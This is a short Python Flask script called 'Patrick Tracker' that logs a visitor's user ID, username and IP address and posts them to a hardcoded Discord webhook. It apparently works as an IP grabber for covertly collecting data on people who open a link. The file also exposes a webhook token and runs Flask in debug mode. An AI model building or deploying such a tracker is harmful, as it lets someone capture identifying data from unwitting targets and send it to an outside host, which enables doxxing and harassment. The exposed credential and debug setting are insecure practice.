from flask import Flask, request
import requests

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1402255451344605315/rILbfgodNnZt0TOY_HbAlnFYNpywPU2P6-9J8X1VH80v87KherO3KgK6JcqrV-Rnp2iC"

@app.route('/')
def index():
    user_id = request.args.get('user', 'Not provided')
    username = request.args.get('username', 'Not provided')
    
    # Get user IP
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # Send to Discord
    data = {
        "embeds": [{
            "title": "🎯 Patrick Tracker - User Data",
            "fields": [
                {"name": "👤 User ID", "value": user_id, "inline": True},
                {"name": "👤 Username", "value": username, "inline": True},
                {"name": "🌐 IP Address", "value": user_ip, "inline": True}
            ],
            "color": 0x00ff00
        }]
    }
    
    requests.post(WEBHOOK_URL, json=data)
    
    return "<h1>Success! Data tracked.</h1>"

if __name__ == '__main__':
    app.run(debug=True)
